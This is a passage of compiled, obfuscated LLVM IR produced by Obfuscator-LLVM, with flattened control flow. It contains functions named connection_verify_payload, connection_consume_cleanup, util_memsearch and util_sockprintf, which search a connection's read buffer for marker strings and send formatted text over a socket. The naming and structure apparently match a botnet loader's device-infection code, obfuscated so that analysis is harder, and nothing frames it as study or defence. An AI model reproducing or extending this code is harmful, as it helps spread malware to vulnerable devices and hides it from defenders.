first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -138431288, i32 -750394543
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1953491371, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.connection*, %struct.connection** %3, align 8
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %18, i32 0, i32 15
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %19, i32 0, i32 0
  %21 = load i32, i32* %4, align 4
  %22 = call i32 @util_memsearch(i8* %20, i32 %21, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.38, i32 0, i32 0), i32 17)
  %23 = icmp ne i32 %22, -1
  %24 = select i1 %23, i32 923112933, i32 1930517837
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %4, align 4
  %27 = mul nsw i32 %26, -1
  store i32 %27, i32* %2, align 4
  store i32 1953491371, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load %struct.connection*, %struct.connection** %3, align 8
  %30 = getelementptr inbounds %struct.connection, %struct.connection* %29, i32 0, i32 15
  %31 = getelementptr inbounds [8192 x i8], [8192 x i8]* %30, i32 0, i32 0
  %32 = load i32, i32* %4, align 4
  %33 = call i32 @util_memsearch(i8* %31, i32 %32, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i32 0, i32 0), i32 7)
  %34 = icmp ne i32 %33, -1
  %35 = select i1 %34, i32 -1764323802, i32 -284152491
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = mul nsw i32 %37, -1
  store i32 %38, i32* %2, align 4
  store i32 1953491371, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load %struct.connection*, %struct.connection** %3, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 15
  %42 = getelementptr inbounds [8192 x i8], [8192 x i8]* %41, i32 0, i32 0
  %43 = load i32, i32* %4, align 4
  %44 = call i32 @util_memsearch(i8* %42, i32 %43, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i32 0, i32 0), i32 14)
  %45 = icmp ne i32 %44, -1
  %46 = select i1 %45, i32 -898842212, i32 -116910285
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %4, align 4
  %49 = mul nsw i32 %48, -1
  store i32 %49, i32* %2, align 4
  store i32 1953491371, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %2, align 4
  store i32 1953491371, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %2, align 4
  ret i32 %53

loopEnd:                                          ; preds = %50, %47, %39, %36, %28, %25, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_verify_payload(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.41, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -499606814, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -499606814, label %first
    i32 -636830355, label %16
    i32 -1595296098, label %17
    i32 1476919550, label %25
    i32 -1341655731, label %27
    i32 -1910987211, label %30
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -636830355, i32 -1595296098
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1910987211, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.connection*, %struct.connection** %3, align 8
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %18, i32 0, i32 15
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %19, i32 0, i32 0
  %21 = load i32, i32* %4, align 4
  %22 = call i32 @util_memsearch(i8* %20, i32 %21, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.42, i32 0, i32 0), i32 14)
  %23 = icmp eq i32 %22, -1
  %24 = select i1 %23, i32 1476919550, i32 -1341655731
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %4, align 4
  store i32 %26, i32* %2, align 4
  store i32 -1910987211, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %4, align 4
  %29 = add nsw i32 255, %28
  store i32 %29, i32* %2, align 4
  store i32 -1910987211, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %2, align 4
  ret i32 %31

loopEnd:                                          ; preds = %27, %25, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_cleanup(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1063693067, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1063693067, label %first
    i32 -403530144, label %16
    i32 267864433, label %17
    i32 -1244782436, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -403530144, i32 267864433
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1244782436, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  store i32 %18, i32* %2, align 4
  store i32 -1244782436, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %2, align 4
  ret i32 %20

loopEnd:                                          ; preds = %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  store i32 %12, i32* %.reg2mem
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -1185533671, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1185533671, label %first
    i32 1344952116, label %16
    i32 -1441567775, label %17
    i32 -761878726, label %18
    i32 -92859658, label %23
    i32 1701794865, label %38
    i32 -1539674706, label %44
    i32 -1557882941, label %47
    i32 972072967, label %48
    i32 -930670301, label %49
    i32 714025106, label %50
    i32 173807694, label %53
    i32 508639662, label %54
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %14 = icmp sgt i32 %.reload, %.reload3
  %15 = select i1 %14, i32 1344952116, i32 -1441567775
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 508639662, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 -761878726, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %10, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp slt i32 %19, %20
  %22 = select i1 %21, i32 -92859658, i32 173807694
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8*, i8** %6, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8*, i8** %8, align 8
  %31 = load i32, i32* %11, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %29, %35
  %37 = select i1 %36, i32 1701794865, i32 972072967
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %40, %41
  %43 = select i1 %42, i32 -1539674706, i32 -1557882941
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %10, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  store i32 508639662, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -930670301, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -930670301, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 714025106, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %10, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %10, align 4
  store i32 -761878726, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 508639662, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %5, align 4
  ret i32 %55

loopEnd:                                          ; preds = %53, %50, %49, %48, %47, %44, %38, %23, %18, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_sockprintf(i32, i8*, ...) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i8, align 1
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [4098 x i8], align 16
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %4, align 4
  store i8* %1, i8** %5, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %10 = bitcast %struct.__va_list_tag* %9 to i8*
  call void @llvm.va_start(i8* %10)
  %11 = getelementptr inbounds [4098 x i8], [4098 x i8]* %6, i32 0, i32 0
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %14 = call i32 @vsnprintf(i8* %11, i64 4096, i8* %12, %struct.__va_list_tag* %13) #5
  store i32 %14, i32* %8, align 4
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = bitcast %struct.__va_list_tag* %15 to i8*
  call void @llvm.va_end(i8* %16)
  %17 = load i32, i32* %8, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2119365061, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2119365061, label %first
    i32 290378441, label %20
    i32 -16308010, label %24
    i32 1480355359, label %25
    i32 -1190918037, label %35
    i32 412486887, label %36
    i32 -1279212096, label %37
    i32 1845797217, label %38
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp sgt i32 %.reload, 0
  %19 = select i1 %18, i32 290378441, i32 -1279212096
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %8, align 4
  %22 = icmp sgt i32 %21, 4096
  %23 = select i1 %22, i32 -16308010, i32 1480355359
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 4096, i32* %8, align 4
  store i32 1480355359, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %4, align 4
  %27 = getelementptr inbounds [4098 x i8], [4098 x i8]* %6, i32 0, i32 0
  %28 = load i32, i32* %8, align 4
  %29 = sext i32 %28 to i64
  %30 = call i64 @send(i32 %26, i8* %27, i64 %29, i32 16384)
  %31 = load i32, i32* %8, align 4
  %32 = sext i32 %31 to i64
  %33 = icmp ne i64 %30, %32
  %34 = select i1 %33, i32 -1190918037, i32 412486887
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i8 0, i8* %3, align 1
  store i32 1845797217, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 -1279212096, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i8 1, i8* %3, align 1
  store i32 1845797217, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i8, i8* %3, align 1
  ret i8 %39

loopEnd:                                          ; preds = %37, %36, %35, %25, %24, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: nounwind
declare i32 @vsnprintf(i8*, i64, i8*, %struct.__va_list_tag*) #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
